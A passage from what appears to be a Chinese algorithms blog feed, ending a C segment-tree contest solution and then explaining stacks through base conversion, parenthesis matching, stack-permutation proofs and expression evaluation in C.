class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        update2(i&lt;&lt;<span class="number">1</span>,l,mid);</span><br><span class="line">        update2((i&lt;&lt;<span class="number">1</span>)|<span class="number">1</span>,mid+<span class="number">1</span>,r);</span><br><span class="line">    &#125;</span><br><span class="line">    pushup(i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> t;</span><br><span class="line">    <span class="keyword">int</span> cnt=<span class="number">1</span>;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;t);</span><br><span class="line">    <span class="keyword">while</span>(t--)&#123;</span><br><span class="line">        <span class="keyword">int</span> n,m;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Case %d:\n&quot;</span>,cnt++);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;n,&amp;m);</span><br><span class="line">        build(<span class="number">1</span>,<span class="number">1</span>,n);</span><br><span class="line">        <span class="keyword">char</span> op[<span class="number">10</span>];</span><br><span class="line">        <span class="keyword">int</span> x;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;m;i++)&#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,op);</span><br><span class="line">            <span class="keyword">int</span> l,r;</span><br><span class="line">            <span class="keyword">if</span>(op[<span class="number">0</span>]==<span class="string">&#x27;D&#x27;</span>)&#123;</span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">                <span class="keyword">int</span> tmp=query(<span class="number">1</span>,x);</span><br><span class="line">                <span class="keyword">if</span>(tmp==<span class="number">0</span>) <span class="built_in">printf</span>(<span class="string">&quot;fly with yourself\n&quot;</span>);</span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                    update1(<span class="number">1</span>,tmp,tmp+x<span class="number">-1</span>);</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;%d,let&#x27;s fly\n&quot;</span>,tmp);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(op[<span class="number">0</span>]==<span class="string">&#x27;N&#x27;</span>)&#123;</span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">                <span class="keyword">int</span> tmp=query(<span class="number">1</span>,x);</span><br><span class="line">                <span class="keyword">if</span>(tmp!=<span class="number">0</span>)&#123;</span><br><span class="line">                    update2(<span class="number">1</span>,tmp,tmp+x<span class="number">-1</span>);</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;%d,don&#x27;t put my gezi\n&quot;</span>,tmp);</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                tmp=query1(<span class="number">1</span>,x);</span><br><span class="line">                <span class="keyword">if</span>(tmp!=<span class="number">0</span>)&#123;</span><br><span class="line">                    update2(<span class="number">1</span>,tmp,tmp+x<span class="number">-1</span>);</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;%d,don&#x27;t put my gezi\n&quot;</span>,tmp);</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;wait for me\n&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;l,&amp;r);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;I am the hope of chinese chengxuyuan!!\n&quot;</span>);</span><br><span class="line">                update(<span class="number">1</span>,l,r);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>Data structure</tag>
      </tags>
  </entry>
  <entry>
    <title>栈和队列</title>
    <url>/algorithm/stack/</url>
    <content><![CDATA[<p>相对于一般序列结构，栈和队列的操作仅限于逻辑上特定的某端，二者元素接受操作的次序不同，简而言之，栈是先进后出，而队列为先进先出。在信息处理领域，栈和队列的身影随处可见，不少程序设计语言即建立在栈结构之上，我们日常生活中对自然资源和社会资源分配、调度银行和医院服务窗口可借助队列实现合理和优化的分配。</p>
<a id="more"></a>

<h1 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h1><p>栈是存放数据对象的一种特殊容器，其中的数据元素按线性的逻辑次序排列，但是插入操作仅限于栈的某一特定端，只能在栈顶插入和删除。栈中元素接受操作的次序必然遵循所谓的后进先出规律：从栈的整个生命周期来看，更晚出栈的元素应为更早入栈者。</p>
<p><strong>栈和递归</strong></p>
<p>调用栈的基本单位是帧，每次函数调用时都会相应地创建一帧，记录该函数在二进制程序中的返回地址，以及局部变量、传入参数等，并将该帧压入调用栈。在任一时刻，调用栈中的各帧依次对应于那些尚未返回的调用的实例，即当时的活跃函数实例</p>
<h1 id="栈的应用"><a href="#栈的应用" class="headerlink" title="栈的应用"></a>栈的应用</h1><h2 id="逆序输出"><a href="#逆序输出" class="headerlink" title="逆序输出"></a>逆序输出</h2><p>输出次序和处理过程颠倒，递归深度和输出长度不易预知</p>
<p><strong>进制转换</strong></p>
<blockquote>
<p>给定任意10进制非负整数，将其转换为d进制表示形式</p>
</blockquote>
<p>迭代模式</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">convert</span> <span class="params">( Stack&lt;<span class="keyword">char</span>&gt;&amp; S, __int64 n, <span class="keyword">int</span> base )</span> </span>&#123; <span class="comment">//十进制数n到base进制的转换（迭代版）</span></span><br><span class="line">   <span class="keyword">static</span> <span class="keyword">char</span> digit[] <span class="comment">//0 &lt; n, 1 &lt; base &lt;= 16，新进制下的数位符号，可视base取值范围适当扩充</span></span><br><span class="line">   = &#123; <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;F&#x27;</span> &#125;;</span><br><span class="line">   <span class="keyword">while</span> ( n &gt; <span class="number">0</span> ) &#123; <span class="comment">//由低到高，逐一计算出新进制下的各数位</span></span><br><span class="line">      <span class="keyword">int</span> remainder = ( <span class="keyword">int</span> ) ( n % base ); S.push ( digit[remainder] ); <span class="comment">//余数（当前位）入栈</span></span><br><span class="line">      n /= base; <span class="comment">//n更新为其对base的除商</span></span><br><span class="line">   &#125;</span><br><span class="line">&#125; <span class="comment">//新进制下由高到低的各数位，自顶而下保存于栈S中</span></span><br></pre></td></tr></table></figure>
<p>递归模式</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">convert</span> <span class="params">( Stack&lt;<span class="keyword">char</span>&gt;&amp; S, __int64 n, <span class="keyword">int</span> base )</span> </span>&#123; <span class="comment">//十进制正整数n到base进制的转换（递归版）</span></span><br><span class="line">   <span class="keyword">static</span> <span class="keyword">char</span> digit[] <span class="comment">//0 &lt; n, 1 &lt; base &lt;= 16，新进制下的数位符号，可视base取值范围适当扩充</span></span><br><span class="line">   = &#123; <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;F&#x27;</span> &#125;;</span><br><span class="line">   <span class="keyword">if</span> ( <span class="number">0</span> &lt; n ) &#123; <span class="comment">//在尚有余数之前，反复地</span></span><br><span class="line">      S.push ( digit[n % base] ); <span class="comment">//逆向记录当前最低位，再</span></span><br><span class="line">      convert ( S, n / base, base ); <span class="comment">//通过递归得到所有更高位</span></span><br><span class="line">   &#125;</span><br><span class="line">&#125; <span class="comment">//新进制下由高到低的各数位，自顶而下保存于栈S中</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">( <span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[] )</span> </span>&#123;</span><br><span class="line">      Stack&lt;<span class="keyword">char</span>&gt; S; <span class="comment">//用栈记录转换得到的各数位</span></span><br><span class="line">      convert ( S, n, base ); <span class="comment">//进制转换</span></span><br><span class="line">      <span class="keyword">while</span> ( !S.empty() ) <span class="built_in">printf</span> ( <span class="string">&quot;%c&quot;</span>, ( S.pop() ) ); <span class="comment">//逆序输出栈内数位，即正确结果</span></span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="递归嵌套"><a href="#递归嵌套" class="headerlink" title="递归嵌套"></a>递归嵌套</h2><p>具有自相似性的问题可递归描述，但分支位置和嵌套深度不固定</p>
<p><strong>括号匹配</strong></p>
<blockquote>
<p>检查表达式括号是否匹配</p>
</blockquote>
<p>递归实现</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">trim</span> <span class="params">( <span class="keyword">const</span> <span class="keyword">char</span> <span class="built_in">exp</span>[], <span class="keyword">int</span>&amp; lo, <span class="keyword">int</span>&amp; hi )</span> </span>&#123; <span class="comment">//删除exp[lo, hi]不含括号的最长前缀、后缀</span></span><br><span class="line">   <span class="keyword">while</span> ( ( lo &lt;= hi ) &amp;&amp; ( <span class="built_in">exp</span>[lo] != <span class="string">&#x27;(&#x27;</span> ) &amp;&amp; ( <span class="built_in">exp</span>[lo] != <span class="string">&#x27;)&#x27;</span> ) ) lo++; <span class="comment">//查找第一个和</span></span><br><span class="line">   <span class="keyword">while</span> ( ( lo &lt;= hi ) &amp;&amp; ( <span class="built_in">exp</span>[hi] != <span class="string">&#x27;(&#x27;</span> ) &amp;&amp; ( <span class="built_in">exp</span>[hi] != <span class="string">&#x27;)&#x27;</span> ) ) hi--; <span class="comment">//最后一个括号</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">divide</span> <span class="params">( <span class="keyword">const</span> <span class="keyword">char</span> <span class="built_in">exp</span>[], <span class="keyword">int</span> lo, <span class="keyword">int</span> hi )</span> </span>&#123; <span class="comment">//切分exp[lo, hi]，使exp匹配仅当子表达式匹配</span></span><br><span class="line">   <span class="keyword">int</span> mi = lo; <span class="keyword">int</span> crc = <span class="number">1</span>; <span class="comment">//crc为[lo, mi]范围内左、右括号数目之差</span></span><br><span class="line">   <span class="keyword">while</span> ( ( <span class="number">0</span> &lt; crc ) &amp;&amp; ( ++mi &lt; hi ) ) <span class="comment">//逐个检查各字符，直到左、右括号数目相等，或者越界</span></span><br><span class="line">      &#123;  <span class="keyword">if</span> ( <span class="built_in">exp</span>[mi] == <span class="string">&#x27;)&#x27;</span> )  crc--; <span class="keyword">if</span> ( <span class="built_in">exp</span>[mi] == <span class="string">&#x27;(&#x27;</span> )  crc++;  &#125; <span class="comment">//左、右括号分别计数</span></span><br><span class="line">   <span class="keyword">return</span> mi; <span class="comment">//若mi &lt;= hi，则为合法切分点；否则，意味着局部不可能匹配</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">paren</span> <span class="params">( <span class="keyword">const</span> <span class="keyword">char</span> <span class="built_in">exp</span>[], <span class="keyword">int</span> lo, <span class="keyword">int</span> hi )</span> </span>&#123; <span class="comment">//检查表达式exp[lo, hi]是否括号匹配（递归版）</span></span><br><span class="line">   trim ( <span class="built_in">exp</span>, lo, hi ); <span class="keyword">if</span> ( lo &gt; hi ) <span class="keyword">return</span> <span class="literal">true</span>; <span class="comment">//清除不含括号的前缀、后缀</span></span><br><span class="line">   <span class="keyword">if</span> ( <span class="built_in">exp</span>[lo] != <span class="string">&#x27;(&#x27;</span> ) <span class="keyword">return</span> <span class="literal">false</span>; <span class="comment">//首字符非左括号，则必不匹配</span></span><br><span class="line">   <span class="keyword">if</span> ( <span class="built_in">exp</span>[hi] != <span class="string">&#x27;)&#x27;</span> ) <span class="keyword">return</span> <span class="literal">false</span>; <span class="comment">//末字符非右括号，则必不匹配</span></span><br><span class="line">   <span class="keyword">int</span> mi = divide ( <span class="built_in">exp</span>, lo, hi ); <span class="comment">//确定适当的切分点</span></span><br><span class="line">   <span class="keyword">if</span> ( mi &gt; hi ) <span class="keyword">return</span> <span class="literal">false</span>; <span class="comment">//切分点不合法，意味着局部以至整体不匹配</span></span><br><span class="line">   <span class="keyword">return</span> paren ( <span class="built_in">exp</span>, lo + <span class="number">1</span>, mi - <span class="number">1</span> ) &amp;&amp; paren ( <span class="built_in">exp</span>, mi + <span class="number">1</span>, hi ); <span class="comment">//分别检查左、右子表达式</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>迭代实现</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">paren</span> <span class="params">( <span class="keyword">const</span> <span class="keyword">char</span> <span class="built_in">exp</span>[], <span class="keyword">int</span> lo, <span class="keyword">int</span> hi )</span> </span>&#123; <span class="comment">//表达式括号匹配检查，可兼顾三种括号</span></span><br><span class="line">   Stack&lt;<span class="keyword">char</span>&gt; S; <span class="comment">//使用栈记录已发现但尚未匹配的左括号</span></span><br><span class="line">   <span class="keyword">for</span> ( <span class="keyword">int</span> i = lo; i &lt;= hi; i++ ) <span class="comment">/* 逐一检查当前字符 */</span> <span class="comment">/*DSA*/</span>&#123;</span><br><span class="line">      <span class="keyword">switch</span> ( <span class="built_in">exp</span>[i] ) &#123; <span class="comment">//左括号直接进栈；右括号若与栈顶失配，则表达式必不匹配</span></span><br><span class="line">         <span class="keyword">case</span> <span class="string">&#x27;(&#x27;</span>: <span class="keyword">case</span> <span class="string">&#x27;[&#x27;</span>: <span class="keyword">case</span> <span class="string">&#x27;&#123;&#x27;</span>: S.push ( <span class="built_in">exp</span>[i] ); <span class="keyword">break</span>;</span><br><span class="line">         <span class="keyword">case</span> <span class="string">&#x27;)&#x27;</span>: <span class="keyword">if</span> ( ( S.empty() ) || ( <span class="string">&#x27;(&#x27;</span> != S.pop() ) ) <span class="keyword">return</span> <span class="literal">false</span>; <span class="keyword">break</span>;</span><br><span class="line">         <span class="keyword">case</span> <span class="string">&#x27;]&#x27;</span>: <span class="keyword">if</span> ( ( S.empty() ) || ( <span class="string">&#x27;[&#x27;</span> != S.pop() ) ) <span class="keyword">return</span> <span class="literal">false</span>; <span class="keyword">break</span>;</span><br><span class="line">         <span class="keyword">case</span> <span class="string">&#x27;&#125;&#x27;</span>: <span class="keyword">if</span> ( ( S.empty() ) || ( <span class="string">&#x27;&#123;&#x27;</span> != S.pop() ) ) <span class="keyword">return</span> <span class="literal">false</span>; <span class="keyword">break</span>;</span><br><span class="line">         <span class="keyword">default</span>: <span class="keyword">break</span>; <span class="comment">//非括号字符一律忽略</span></span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> S.empty(); <span class="comment">//整个表达式扫描过后，栈中若仍残留（左）括号，则不匹配；否则（栈空）匹配</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>栈混洗</strong></p>
<p>考察栈$A=&lt;a_1,a_2,…,a_n]$,$B$为空栈,A左端为栈顶</p>
<p>只允许将A的顶元素弹出并压入S,或将S的顶元素弹出并压入B</p>
<p>经过上述一系列操作后，A中元素全部转入B中，</p>
<p>$B=[a_{k1},a_{k2},…,a_{kn} &gt;$，B右端为栈顶</p>
<p>同一输入序列，可有多种栈混洗</p>
<p>$[1,2,3,4&gt;,[4,3,2,1&gt;,[3,2,4,1&gt;$</p>
<p>长度为$n$的栈混洗，可能的栈混洗个数<br>$$<br>SP(n)=\frac{(2n)!}{n!(n+1)!}<br>$$<br>设s在$k$次pop之后首次重新变空，则$k$无非$n$种情况</p>
<p>$SP(n)=\sum_{k=1}^{n}SP(k-1)SP(n-k)=catalan(n)$</p>
<blockquote>
<p>设B为A的任意排列，则B为A的一个栈混洗，当且仅当对于任意的1&lt;=i&lt;j&lt;k&lt;=n,不存在{…,k,…,i,…,j…} </p>
</blockquote>
<p>先证明仅当，首先，对于输入序列中的任意三个元素，其在输出序列中是否存在一个可行的相对排列次序与其它元素无关。不妨只关注这三个元素${i,j,k}$</p>
<p>无论如何,元素$i,j$必然先于$k$(弹出A并随即压入B中)压入中转栈S,若输出序列${k,i,j}$存在，则意味着这三个元素中，k必然首先从栈S中弹出，并且根据先进后出的规律，此时$i,j$存在于栈S中，且顺序只能为$j,i$，三者的次序必然是${k,j,i}$则$k$率先从栈S弹出，则三者压入输出栈B的次序必然是${k,j,i}$,而不是${k,i,j}$。</p>
<p>再证明当，对于任何不含禁形的输出序列，都可给出对应的栈混洗过程。</p>
<blockquote>
<p>对任意1&lt;=i&lt;j&lt;=n,B中都不含模式{…,j+1,…,i,…,j…},则B必定为A的一个栈混洗</p>
</blockquote>
<p>将${j+1,i,j}$视作新一类的禁形，称为615禁形，${k,i,j}$称为915禁形。</p>
<p>接下来证明，只要B中含有915禁形，必然也含有615禁形，当然，两者中的$i,j$未必一致</p>
<p>假定对于任何的$k-i&lt;d$,以上命题均成立，接下来考虑$k-i=d$的情况</p>
<p>不妨设$i&lt;j&lt;k-1$,于是元素$k-1$在B中的相对于$i$的位置无非两种可能</p>
<ol>
<li><strong>k-1位于i的左方(前方)</strong>  此时${k-1,i,j}$即915禁形，$k-1-i&lt;d$，所以必然含有615禁形</li>
<li><strong>k-1位于i的右侧</strong> ${k,i,k-1}$即构成一个615禁形</li>
</ol>
<blockquote>
<p>若对任意1&lt;j&lt;k&lt;=n，B中都不含模式{…,k,…,j-1,…,j…},则B未必为A的栈混洗</p>
</blockquote>
<p>945特征${k,j-1,j}$不称作禁形，915禁形未必含有945模式。</p>
<p>例如，B={2,4,1,3}</p>
<p>其中{3,1,2},{4,1,2},{4,2,3}，不含有任何945模式，但是却含有915模式{4,2,3},同时也是615模式。</p>
<h2 id="延迟缓冲"><a href="#延迟缓冲" class="headerlink" title="延迟缓冲"></a>延迟缓冲</h2><p>在一些应用问题中，输入可分解为多个单元并通过迭代依次扫描处理，但过程中的各步计算往往滞后于扫描的进度，需要待到必要信息已完整到一定程度时才能做出判断。在这类场合，栈结构可以扮演缓冲区的角色。</p>
<p><strong>表达式求值</strong></p>
<p>自左向右扫描表达式，用栈记录已经扫描的部分(含执行计算的结果)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N_OPTR 9 <span class="comment">//运算符总数</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span> &#123;</span> ADD, SUB, MUL, DIV, POW, FAC, L_P, R_P, EOE &#125; Operator; <span class="comment">//运算符集合</span></span><br><span class="line"><span class="comment">//加、减、乘、除、乘方、阶乘、左括号、右括号、起始符与终止符</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> pri[N_OPTR][N_OPTR] = &#123; <span class="comment">//运算符优先等级 [栈顶] [当前]</span></span><br><span class="line">   <span class="comment">/*              |-------------------- 当 前 运 算 符 --------------------| */</span></span><br><span class="line">   <span class="comment">/*              +      -      *      /      ^      !      (      )      \0 */</span></span><br><span class="line">   <span class="comment">/* --  + */</span>    <span class="string">&#x27;&gt;&#x27;</span>,   <span class="string">&#x27;&gt;&#x27;</span>,   <span class="string">&#x27;&lt;&#x27;</span>,   <span class="string">&#x27;&lt;&#x27;</span>,   <span class="string">&#x27;&lt;&#x27;</span>,   <span class="string">&#x27;&lt;&#x27;</span>,   <span class="string">&#x27;&lt;&#x27;</span>,   <span class="string">&#x27;&gt;&#x27;</span>,   <span class="string">&#x27;&gt;&#x27;</span>,</span><br><span class="line">   <span class="comment">/* |   - */</span>    <span class="string">&#x27;&gt;&#x27;</span>,   <span class="string">&#x27;&gt;&#x27;</span>,   <span class="string">&#x27;&lt;&#x27;</span>,   <span class="string">&#x27;&lt;&#x27;</span>,   <span class="string">&#x27;&lt;&#x27;</span>,   <span class="string">&#x27;&lt;&#x27;</span>,   <span class="string">&#x27;&lt;&#x27;</span>,   <span class="string">&#x27;&gt;&#x27;</span>,   <span class="string">&#x27;&gt;&#x27;</span>,</span><br><span class="line">   <span class="comment">/* 栈  * */</span>    <span class="string">&#x27;&gt;&#x27;</span>,   <span class="string">&#x27;&gt;&#x27;</span>,   <span class="string">&#x27;&gt;&#x27;</span>,   <span class="string">&#x27;&gt;&#x27;</span>,   <span class="string">&#x27;&lt;&#x27;</span>,   <span class="string">&#x27;&lt;&#x27;</span>,   <span class="string">&#x27;&lt;&#x27;</span>,   <span class="string">&#x27;&gt;&#x27;</span>,   <span class="string">&#x27;&gt;&#x27;</span>,</span><br><span class="line">   <span class="comment">/* 顶  / */</span>    <span class="string">&#x27;&gt;&#x27;</span>,   <span class="string">&#x27;&gt;&#x27;</span>,   <span class="string">&#x27;&gt;&#x27;</span>,   <span class="string">&#x27;&gt;&#x27;</span>,   <span class="string">&#x27;&lt;&#x27;</span>,   <span class="string">&#x27;&lt;&#x27;</span>,   <span class="string">&#x27;&lt;&#x27;</span>,   <span class="string">&#x27;&gt;&#x27;</span>,   <span class="string">&#x27;&gt;&#x27;</span>,</span><br><span class="line">   <span class="comment">/* 运  ^ */</span>    <span class="string">&#x27;&gt;&#x27;</span>,   <span class="string">&#x27;&gt;&#x27;</span>,   <span class="string">&#x27;&gt;&#x27;</span>,   <span class="string">&#x27;&gt;&#x27;</span>,   <span class="string">&#x27;&gt;&#x27;</span>,   <span class="string">&#x27;&lt;&#x27;</span>,   <span class="string">&#x27;&lt;&#x27;</span>,   <span class="string">&#x27;&gt;&#x27;</span>,   <span class="string">&#x27;&gt;&#x27;</span>,</span><br><span class="line">   <span class="comment">/* 算  ! */</span>    <span class="string">&#x27;&gt;&#x27;</span>,   <span class="string">&#x27;&gt;&#x27;</span>,   <span class="string">&#x27;&gt;&#x27;</span>,   <span class="string">&#x27;&gt;&#x27;</span>,   <span class="string">&#x27;&gt;&#x27;</span>,   <span class="string">&#x27;&gt;&#x27;</span>,   <span class="string">&#x27; &#x27;</span>,   <span class="string">&#x27;&gt;&#x27;</span>,   <span class="string">&#x27;&gt;&#x27;</span>,</span><br><span class="line">   <span class="comment">/* 符  ( */</span>    <span class="string">&#x27;&lt;&#x27;</span>,   <span class="string">&#x27;&lt;&#x27;</span>,   <span class="string">&#x27;&lt;&#x27;</span>,   <span class="string">&#x27;&lt;&#x27;</span>,   <span class="string">&#x27;&lt;&#x27;</span>,   <span class="string">&#x27;&lt;&#x27;</span>,   <span class="string">&#x27;&lt;&#x27;</span>,   <span class="string">&#x27;=&#x27;</span>,   <span class="string">&#x27; &#x27;</span>,</span><br><span class="line">   <span class="comment">/* |   ) */</span>    <span class="string">&#x27; &#x27;</span>,   <span class="string">&#x27; &#x27;</span>,   <span class="string">&#x27; &#x27;</span>,   <span class="string">&#x27; &#x27;</span>,   <span class="string">&#x27; &#x27;</span>,   <span class="string">&#x27; &#x27;</span>,   <span class="string">&#x27; &#x27;</span>,   <span class="string">&#x27; &#x27;</span>,   <span class="string">&#x27; &#x27;</span>,</span><br><span class="line">   <span class="comment">/* -- \0 */</span>    <span class="string">&#x27;&lt;&#x27;</span>,   <span class="string">&#x27;&lt;&#x27;</span>,   <span class="string">&#x27;&lt;&#x27;</span>,   <span class="string">&#x27;&lt;&#x27;</span>,   <span class="string">&#x27;&lt;&#x27;</span>,   <span class="string">&#x27;&lt;&#x27;</span>,   <span class="string">&#x27;&lt;&#x27;</span>,   <span class="string">&#x27; &#x27;</span>,   <span class="string">&#x27;=&#x27;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">float</span> <span class="title">evaluate</span> <span class="params">( <span class="keyword">char</span>* S, <span class="keyword">char</span>*&amp; RPN )</span> </span>&#123; <span class="comment">//对（已剔除白空格的）表达式S求值，并转换为逆波兰式RPN</span></span><br><span class="line">   Stack&lt;<span class="keyword">float</span>&gt; opnd; Stack&lt;<span class="keyword">char</span>&gt; optr; <span class="comment">//运算数栈、运算符栈 任何时刻，其中每对相邻元素之间均大小一致</span></span><br><span class="line">   <span class="keyword">char</span>* expr = S;</span><br><span class="line">   optr.push ( <span class="string">&#x27;\0&#x27;</span> ); <span class="comment">//尾哨兵&#x27;\0&#x27;也作为头哨兵首先入栈</span></span><br><span class="line">   <span class="keyword">while</span> ( !optr.empty() ) &#123; <span class="comment">//在运算符栈非空之前，逐个处理表达式中各字符</span></span><br><span class="line">      <span class="keyword">if</span> ( <span class="built_in">isdigit</span> ( *S ) ) &#123; <span class="comment">//若当前字符为操作数，则</span></span><br><span class="line">         readNumber ( S, opnd ); append ( RPN, opnd.top() ); <span class="comment">//读入操作数，并将其接至RPN末尾</span></span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="comment">//若当前字符为运算符，则</span></span><br><span class="line">         <span class="keyword">switch</span> ( orderBetween ( optr.top(), *S ) ) &#123; <span class="comment">//视其与栈顶运算符之间优先级高低分别处理</span></span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;&lt;&#x27;</span>: <span class="comment">//栈顶运算符优先级更低时</span></span><br><span class="line">               optr.push ( *S ); S++; <span class="comment">//计算推迟，当前运算符进栈</span></span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;=&#x27;</span>: <span class="comment">//优先级相等（当前运算符为右括号或者尾部哨兵&#x27;\0&#x27;）时</span></span><br><span class="line">               optr.pop(); S++; <span class="comment">//脱括号并接收下一个字符</span></span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;&gt;&#x27;</span>: &#123; <span class="comment">//栈顶运算符优先级更高时，可实施相应的计算，并将结果重新入栈</span></span><br><span class="line">               <span class="keyword">char</span> op = optr.pop(); append ( RPN, op ); <span class="comment">//栈顶运算符出栈并续接至RPN末尾</span></span><br><span class="line">               <span class="keyword">if</span> ( <span class="string">&#x27;!&#x27;</span> == op ) &#123; <span class="comment">//若属于一元运算符</span></span><br><span class="line">                  <span class="keyword">float</span> pOpnd = opnd.pop(); <span class="comment">//只需取出一个操作数，并</span></span><br><span class="line">                  opnd.push ( calcu ( op, pOpnd ) ); <span class="comment">//实施一元计算，结果入栈</span></span><br><span class="line">               &#125; <span class="keyword">else</span> &#123; <span class="comment">//对于其它（二元）运算符</span></span><br><span class="line">                  <span class="keyword">float</span> pOpnd2 = opnd.pop(), pOpnd1 = opnd.pop(); <span class="comment">//取出后、前操作数</span></span><br><span class="line">                  opnd.push ( calcu ( pOpnd1, op, pOpnd2 ) ); <span class="comment">//实施二元计算，结果入栈</span></span><br><span class="line">               &#125;</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">default</span> : <span class="built_in">exit</span> ( <span class="number">-1</span> ); <span class="comment">//逢语法错误，不做处理直接退出</span></span><br><span class="line">         &#125;<span class="comment">//switch</span></span><br><span class="line">   &#125;<span class="comment">//while</span></span><br><span class="line">   <span class="keyword">return</span> opnd.pop(); <span class="comment">//弹出并返回最后的计算结果</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>试改进evaluate()算法，检查表达式的语法是否正确</p>
</blockquote>
<p>确认每个操作符与其所对应操作数之间的相对位置符合中缀表达式的语法，在每个操作数入栈时，操作数的规模应该刚好比操作符栈的规模大一。注意，这里的操作符不包括括号和头尾标识符。</p>
<p><strong>逆波兰表达式</strong></p>
<p>逆波兰表达式在由运算符和操作数组成的表达式中，不使用括号即可表达带优先级的运算关系。</p>
<p>RPN转换</p>
